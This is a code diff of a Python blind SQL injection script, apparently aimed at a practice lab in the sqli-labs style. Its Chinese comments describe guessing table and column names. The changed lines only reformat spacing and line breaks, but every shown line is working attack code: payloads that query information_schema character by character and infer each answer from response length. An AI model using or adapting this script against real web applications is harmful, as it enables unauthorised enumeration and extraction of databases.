@@ -52,7 +52,7 @@ if response_2 != response_1:
                         # TODO:猜测表名，圈定表的长度最大10,越大速度越慢
                         for i in range(1, 11):
                             for table_char in base_str:
-                                payload_6 = f"?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit {table_index-1},1),{i},1)='{table_char}'--+"
+                                payload_6 = f"?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit {table_index - 1},1),{i},1)='{table_char}'--+"
                                 if len(requests.get(base_url + payload_6).text) == response_1:
                                     table_name += table_char
                                     print(f"表{table_index}的第{i}个字符: {table_char}")
@@ -80,17 +80,19 @@ if response_2 != response_1:
                                     # TODO:猜测字段名，圈定字段名的长度最大10
                                     for i in range(1, 11):
                                         for column_char in base_str:
-                                            payload_8 = f"?id=1' and substr((select column_name from information_schema.columns where table_schema=database() and table_name='{table_name}' limit {column_index-1},1),{i},1)='{column_char}'--+"
+                                            payload_8 = f"?id=1' and substr((select column_name from information_schema.columns where table_schema=database() and table_name='{table_name}' limit {column_index - 1},1),{i},1)='{column_char}'--+"
                                             if len(requests.get(base_url + payload_8).text) == response_1:
                                                 column_name += column_char
-                                                print(f"表 {table_name} 第 {column_index} 个字段的第 {i} 个字符: {column_char}")
+                                                print(
+                                                    f"表 {table_name} 第 {column_index} 个字段的第 {i} 个字符: {column_char}")
                                                 break
 
                                         # 如果没有字符匹配，结束当前字段名的猜测
                                         if column_char == "":
                                             break
 
-                                    print(f"-------> 表 {table_name} 的字段 {column_index} 的完整字段名为: {column_name} <-------")
+                                    print(
+                                        f"-------> 表 {table_name} 的字段 {column_index} 的完整字段名为: {column_name} <-------")
                                 break
             break
 else:
